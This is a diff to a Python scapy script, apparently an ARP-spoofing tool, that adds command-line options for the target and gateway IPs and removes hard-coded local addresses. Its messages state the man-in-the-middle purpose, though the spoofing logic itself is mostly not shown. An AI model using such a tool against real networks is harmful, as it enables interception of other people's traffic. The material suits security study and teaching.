@@ -3,6 +3,20 @@
 import scapy.all as scapy
 import time
 import sys
+import optparse
+
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target", help="IP of a target machine.")
+    parser.add_option("-g", "--gateway", dest="gateway", help="IP of a gateway.")
+    _options, _args = parser.parse_args()
+    if not _options.target:
+        parser.error("\n[-] Please specify target to perform man in the middle attack.")
+    elif not _options.gateway:
+        parser.error("\n[-] Please specify gateway to perform man in the middle attack.")
+    else:
+        return _options
 
 
 def get_mac(ip):
@@ -26,8 +40,9 @@ def restore(source_ip, destination_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
-target = "192.168.0.15"
-gateway = "192.168.0.1"
+arguments = get_arguments()
+target = arguments.target
+gateway = arguments.gateway
 
 
 packets_sent_counter = 0
